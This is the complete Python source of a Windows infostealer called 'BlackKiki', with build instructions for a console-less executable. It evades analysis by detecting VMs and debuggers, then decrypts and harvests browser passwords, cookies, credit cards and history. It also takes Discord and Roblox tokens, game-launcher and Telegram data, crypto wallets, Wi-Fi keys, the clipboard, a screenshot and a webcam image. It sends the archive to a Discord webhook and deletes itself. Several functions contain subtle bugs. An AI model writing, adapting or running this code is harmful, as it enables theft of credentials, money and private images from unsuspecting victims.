# Compile using:
# pyinstaller main.py --onefile --noconsole --clean --name BlackKiki --icon=icon.ico --hidden-import=pygame --hidden-import=pygame.camera --hidden-import=win32crypt --hidden-import=win32clipboard --hidden-import=win32api --hidden-import=winreg --hidden-import=win32security --hidden-import=win32file --hidden-import=win32process --hidden-import=win32event --hidden-import=psutil --hidden-import=Crypto.Cipher.AES --hidden-import=PIL --hidden-import=PIL.ImageGrab --collect-all pygame --collect-all PIL --noupx
# ------------------------------------
# Rest of the BlackKiki stealer code:
# ------------------------------------
import os,sys,json,base64,sqlite3,shutil,tempfile,zipfile,requests,platform,socket,getpass,datetime,subprocess,re,time,glob,ctypes,hashlib,threading,random,string,win32crypt,win32clipboard,winreg,psutil
from Crypto.Cipher import AES
from PIL import ImageGrab
import pygame
import pygame.camera
import win32api

W = base64.b64decode("YOUR_BASE64_ENCODED_DISCORD_WEBHOOK").decode(errors="ignore")

B = {k:os.path.expandvars(v) for k,v in {
    "c":r"%LOCALAPPDATA%\Google\Chrome\User Data",
    "e":r"%LOCALAPPDATA%\Microsoft\Edge\User Data",
    "b":r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data",
    "o":r"%APPDATA%\Opera Software\Opera Stable",
    "v":r"%LOCALAPPDATA%\Vivaldi\User Data",
    "y":r"%LOCALAPPDATA%\Yandex\YandexBrowser\User Data",
    "g":r"%APPDATA%\Opera Software\Opera GX Stable"
}.items()}

E = ["nkbihfbeogaeaoehlefnkodbefgpgknn","bfnaelmomeimhlpmgjnjophhpkkoljpa","fnjhmkhhmkbjkkabndcnnogagogbneec","egjidjbpglichdcondbcbdnbeeppgdph","afbcbjlebbfndgpncekmhgkgejipdpek","acmacodkjbdgmoleebolmdjonilkdbch","hnmpcagpplmpfojmgmnngilbnojdjame","dmkamcknogkgcdfhhbddcghachkejeap","mkpegjkblkkefacfnmkajcjmabijhclg","aflkmfnggphgkfghjpejdhkchfhmkfbm","kpfopkelmapcoipemfendmdcghnegimn"]

def a(): return sum(1 for _ in psutil.process_iter() if any(x in _.info.get('name','').lower() for x in ["vbox","vmware","qemu","wireshark","ollydbg","x32dbg","x64dbg","procmon","procexp","fiddler"])) > 2

def b(): 
    if sys.platform!="win32": return
    try:
        p = sys.executable if getattr(sys,'frozen',False) else os.path.abspath(sys.argv[0])
        t = os.path.join(tempfile.gettempdir(),f"d{random.randint(10000,999999)}.bat")
        with open(t,"w") as f: f.write(f'@echo off\ntimeout /t 6 >nul\ndel /f /q "{p}" >nul 2>&1\ndel "%~f0" >nul 2>&1\n')
        subprocess.Popen(['cmd','/c',t],creationflags=0x08000000|0x00000008)
    except: pass

def c(): 
    for n in ["chrome","msedge","brave","opera","vivaldi","yandex-browser","firefox","opera_gx"]: 
        try: subprocess.run(f'taskkill /im {n}.exe /f >nul 2>&1',shell=True,timeout=3)
        except: pass

def d(p):
    try:
        with open(os.path.join(p,"Local State"),"r",encoding="utf-8") as f:
            return win32crypt.CryptUnprotectData(base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:],None,None,None,0)[1]
    except: return b""

def e(v,m):
    try:
        if len(v)<15: return ""
        return AES.new(m,AES.MODE_GCM,v[3:15]).decrypt_and_verify(v[15:-16],v[-16:]).decode(errors="ignore")
    except: return ""

def f(s,t):
    try:
        if os.path.exists(s): shutil.copy2(s,t); return True
    except: pass
    return False

def g(r,m,o,l):
    for pr in ["Default"]+[d for d in os.listdir(r) if d.startswith("Profile ")]:
        db=os.path.join(r,pr,"Login Data")
        tmp=os.path.join(o,f"{l}_{pr}_p.db")
        if f(db,tmp):
            try:
                c=sqlite3.connect(tmp)
                cur=c.cursor()
                cur.execute("SELECT origin_url,username_value,password_value FROM logins")
                lines=[f"{u}|{usr}|{e(pw,m)}" for u,usr,pw in cur.fetchall() if e(pw,m)]
                if lines: open(os.path.join(o,f"{l}_{pr}_pass.txt"),"w",encoding="utf-8").write("\n".join(lines))
            except: pass

def h(r,m,o,l):
    for pr in ["Default"]+[d for d in os.listdir(r) if d.startswith("Profile ")]:
        for p in [os.path.join(r,pr,"Network","Cookies"),os.path.join(r,pr,"Cookies")]:
            if not os.path.exists(p): continue
            tmp=os.path.join(o,f"{l}_{pr}_c.db")
            if f(p,tmp):
                try:
                    c=sqlite3.connect(tmp)
                    cur=c.cursor()
                    cur.execute("SELECT host_key,name,encrypted_value FROM cookies")
                    lines=[f"{h}\t{na}\t{e(ev,m)}" for h,na,ev in cur.fetchall() if e(ev,m)]
                    if lines: open(os.path.join(o,f"{l}_{pr}_cook.txt"),"w",encoding="utf-8").write("\n".join(lines))
                except: pass

def i(r,m,o,l):
    for pr in ["Default"]+[d for d in os.listdir(r) if d.startswith("Profile ")]:
        db=os.path.join(r,pr,"Web Data")
        tmp=os.path.join(o,f"{l}_{pr}_af.db")
        if f(db,tmp):
            try:
                c=sqlite3.connect(tmp)
                cur=c.cursor()
                cur.execute("SELECT name_value,value FROM autofill")
                lines=[f"{n}|{v}" for n,v in cur.fetchall() if v]
                if lines: open(os.path.join(o,f"{l}_{pr}_autofill.txt"),"w",encoding="utf-8").write("\n".join(lines))
            except: pass

def j(r,m,o,l):
    for pr in ["Default"]+[d for d in os.listdir(r) if d.startswith("Profile ")]:
        db=os.path.join(r,pr,"Web Data")
        tmp=os.path.join(o,f"{l}_{pr}_cc.db")
        if f(db,tmp):
            try:
                c=sqlite3.connect(tmp)
                cur=c.cursor()
                cur.execute("SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted FROM credit_cards")
                lines=[f"{n}|{m}/{y}|{e(e,m)}" for n,m,y,e in cur.fetchall() if e(e,m)]
                if lines: open(os.path.join(o,f"{l}_{pr}_creditcards.txt"),"w",encoding="utf-8").write("\n".join(lines))
            except: pass

def k(r,o,l):
    for pr in ["Default"]+[d for d in os.listdir(r) if d.startswith("Profile ")]:
        db=os.path.join(r,pr,"History")
        tmp=os.path.join(o,f"{l}_{pr}_h.db")
        if f(db,tmp):
            try:
                c=sqlite3.connect(tmp)
                cur=c.cursor()
                cur.execute("SELECT url,title,visit_time FROM urls")
                lines=[f"{u}|{ti}|{vt}" for u,ti,vt in cur.fetchall()]
                if lines: open(os.path.join(o,f"{l}_{pr}_history.txt"),"w",encoding="utf-8").write("\n".join(lines))
            except: pass

def l(r,o,l):
    for pr in ["Default"]+[d for d in os.listdir(r) if d.startswith("Profile ")]:
        db=os.path.join(r,pr,"History")
        tmp=os.path.join(o,f"{l}_{pr}_dw.db")
        if f(db,tmp):
            try:
                c=sqlite3.connect(tmp)
                cur=c.cursor()
                cur.execute("SELECT target_path,tab_url FROM downloads")
                lines=[f"{tp}|{tu}" for tp,tu in cur.fetchall()]
                if lines: open(os.path.join(o,f"{l}_{pr}_downloads.txt"),"w",encoding="utf-8").write("\n".join(lines))
            except: pass

def m(o):
    paths=[os.path.join(os.getenv("APPDATA"),a,"Local Storage","leveldb") for a in ["discord","discordcanary","discordptb"]]
    for br in B.values():
        if os.path.exists(br): paths.append(os.path.join(br,"Default","Local Storage","leveldb"))
    t=set()
    rx=r'[\w-]{24}\.[\w-]{6}\.[\w-]{27,}'
    for p in paths:
        if not os.path.exists(p): continue
        for ext in [".log",".ldb"]:
            for f in glob.glob(os.path.join(p,f"*{ext}")):
                try:
                    with open(f,errors="ignore") as ff:
                        for x in re.findall(rx,ff.read()): t.add(x)
                except: pass
    if t: open(os.path.join(o,"discord.txt"),"w",encoding="utf-8").write("\n".join(t))

def n(o):
    paths=[os.path.join(os.getenv("APPDATA"),a,"Local Storage","leveldb") for a in ["discord","discordcanary","discordptb"]]
    for br in B.values():
        if os.path.exists(br): paths.append(os.path.join(br,"Default","Local Storage","leveldb"))
    t=set()
    rx=r'[\w-]{24}\.[\w-]{6}\.[\w-]{27,}'
    for p in paths:
        if not os.path.exists(p): continue
        for ext in [".log",".ldb"]:
            for f in glob.glob(os.path.join(p,f"*{ext}")):
                try:
                    with open(f,errors="ignore") as ff:
                        for x in re.findall(rx,ff.read()):
                            if "roblox" in ff.read().lower(): t.add(x)
                except: pass
    rb=os.path.join(os.getenv("APPDATA"),"Roblox")
    if os.path.exists(rb):
        try:
            for f in glob.glob(os.path.join(rb,"**","*.txt"),recursive=True):
                with open(f,errors="ignore") as ff:
                    if ".ROBLOSECURITY" in ff.read(): t.add(ff.read().strip())
        except: pass
    if t: open(os.path.join(o,"roblox.txt"),"w",encoding="utf-8").write("\n".join(t))

def o(o):
    s=os.path.expandvars(r"%PROGRAMFILES(x86)%\Steam")
    if os.path.exists(s):
        try: shutil.copytree(s,os.path.join(o,"steam"),dirs_exist_ok=True,ignore=shutil.ignore_patterns("*.log"))
        except: pass

def p(o):
    e=os.path.expandvars(r"%PROGRAMDATA%\Epic")
    if os.path.exists(e):
        try: shutil.copytree(e,os.path.join(o,"epic"),dirs_exist_ok=True)
        except: pass

def q(o):
    b=os.path.expandvars(r"%PROGRAMDATA%\Battle.net")
    if os.path.exists(b):
        try: shutil.copytree(b,os.path.join(o,"battlenet"),dirs_exist_ok=True)
        except: pass

def r(o):
    ri=os.path.expandvars(r"%PROGRAMDATA%\Riot Games")
    if os.path.exists(ri):
        try: shutil.copytree(ri,os.path.join(o,"riot"),dirs_exist_ok=True)
        except: pass

def s(o):
    t=os.path.join(os.getenv("APPDATA"),"Telegram Desktop","tdata")
    if os.path.exists(t):
        try: shutil.copytree(t,os.path.join(o,"telegram"),dirs_exist_ok=True,ignore=shutil.ignore_patterns("*.lock"))
        except: pass

def t(o):
    wd=os.path.join(o,"wallets")
    os.makedirs(wd,exist_ok=True)
    for ext in E:
        for br in B.values():
            if not os.path.exists(br): continue
            ep=os.path.join(br,"Default","Local Extension Settings",ext)
            if os.path.exists(ep):
                try: shutil.copytree(ep,os.path.join(wd,ext[:12]),dirs_exist_ok=True)
                except: pass
    dw={
        "exodus":os.path.join(os.getenv("APPDATA"),"Exodus"),
        "atomic":os.path.join(os.getenv("APPDATA"),"atomic"),
        "electrum":os.path.join(os.getenv("APPDATA"),"Electrum","wallets"),
        "coinomi":os.path.join(os.getenv("APPDATA"),"Coinomi"),
    }
    for n,p in dw.items():
        if os.path.exists(p):
            try: shutil.copytree(p,os.path.join(wd,n),dirs_exist_ok=True)
            except: pass

def u(o):
    try:
        k=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
        apps=[]
        i=0
        while True:
            try:
                sub=winreg.EnumKey(k,i)
                sk=winreg.OpenKey(k,sub)
                try: apps.append(winreg.QueryValueEx(sk,"DisplayName")[0])
                except: pass
                winreg.CloseKey(sk)
                i+=1
            except: break
        winreg.CloseKey(k)
        if apps: open(os.path.join(o,"apps.txt"),"w",encoding="utf-8").write("\n".join(sorted(set(apps))))
    except: pass

def v(o):
    try:
        procs=[]
        for p in psutil.process_iter(['name','pid','username','cpu_percent']):
            try: procs.append(f"{p.info['name']}|{p.info['pid']}|{p.info['username']}|{p.info['cpu_percent']}")
            except: pass
        if procs: open(os.path.join(o,"processes.txt"),"w",encoding="utf-8").write("\n".join(procs))
    except: pass

def w(o):
    try: ip=requests.get("https://api.ipify.org",timeout=5).text
    except: ip="x"
    info=[
        f"user:{getpass.getuser()}",
        f"host:{socket.gethostname()}",
        f"ip:{ip}",
        f"os:{platform.platform()}",
        f"cpu:{platform.processor()}",
        f"ram:{psutil.virtual_memory().total//(1024**3)}GB",
        f"gpu:{win32api.GetSystemMetrics(0)}x{win32api.GetSystemMetrics(1)}",
        f"drives:{[d.mountpoint for d in psutil.disk_partitions()]}",
        f"time:{datetime.datetime.now()}",
    ]
    open(os.path.join(o,"sys.txt"),"w",encoding="utf-8").write("\n".join(info))

def x(o):
    try: ImageGrab.grab().save(os.path.join(o,"scr.png"))
    except: pass

def y(o):
    try:
        pygame.camera.init()
        cams=pygame.camera.list_cameras()
        if cams:
            cam=pygame.camera.Camera(cams[0],(640,480))
            cam.start()
            img=cam.get_image()
            pygame.image.save(img,os.path.join(o,"webcam.jpg"))
            cam.stop()
    except: pass

def z():
    try:
        win32clipboard.OpenClipboard()
        data=win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return str(data)
    except: return ""

def aa(o):
    try:
        outp=subprocess.check_output("netsh wlan show profiles",shell=True).decode(errors="ignore")
        profiles=[line.split(":")[1].strip() for line in outp.split("\n") if "All User Profile" in line]
        res=[]
        for pr in profiles:
            try:
                cmd=f'netsh wlan show profile name="{pr}" key=clear'
                out=subprocess.check_output(cmd,shell=True).decode(errors="ignore")
                for line in out.split("\n"):
                    if "Key Content" in line: res.append(f"{pr}|{line.split(':')[1].strip()}")
            except: pass
        if res: open(os.path.join(o,"wifi.txt"),"w",encoding="utf-8").write("\n".join(res))
    except: pass

def bb():
    if a(): b(); return
    c()
    tmp=tempfile.mkdtemp()
    bd=os.path.join(tmp,"b"); os.makedirs(bd,exist_ok=True)
    wd=os.path.join(tmp,"w"); os.makedirs(wd,exist_ok=True)
    md=os.path.join(tmp,"m"); os.makedirs(md,exist_ok=True)
    w(md)
    open(os.path.join(md,"clip.txt"),"w",encoding="utf-8").write(z())
    x(md)
    y(md)
    aa(md)
    u(md)
    v(md)
    for k,n in [("c","Chrome"),("e","Edge"),("b","Brave"),("o","Opera"),("v","Vivaldi"),("y","Yandex"),("g","OperaGX")]:
        p=B.get(k,"")
        if not os.path.exists(p): continue
        mk=d(p)
        if mk:
            g(p,mk,bd,n)
            h(p,mk,bd,n)
            i(p,mk,bd,n)
            j(p,mk,bd,n)
            k(p,bd,n)
            l(p,bd,n)
    m(md)
    n(md)
    o(md)
    p(md)
    q(md)
    r(md)
    s(md)
    t(wd)
    zf=os.path.join(tempfile.gettempdir(),f"blackkiki_{getpass.getuser()}_{int(time.time())}.zip")
    with zipfile.ZipFile(zf,"w",zipfile.ZIP_DEFLATED) as zf_:
        for rt,_,fs in os.walk(tmp):
            for fn in fs:
                p=os.path.join(rt,fn)
                zf_.write(p,os.path.relpath(p,tmp))
    u=getpass.getuser()
    try: ip=requests.get("https://api.ipify.org",timeout=5).text
    except: ip="x"
    requests.post(W,json={"content":f"**BlackKiki** → {u} @ {ip}","embeds":[{"title":"BlackKiki Grabber","description":f"User: {u}\nIP: {ip}\nOS: {platform.platform()}\nTime: {datetime.datetime.now()}","color":0x111111}]})
    with open(zf,"rb") as f: requests.post(W,files={"file":(f"blackkiki_{u}.zip",f,"application/zip")})
    try: shutil.rmtree(tmp); os.remove(zf)
    except: pass
    b()

if __name__=="__main__":
    bb()
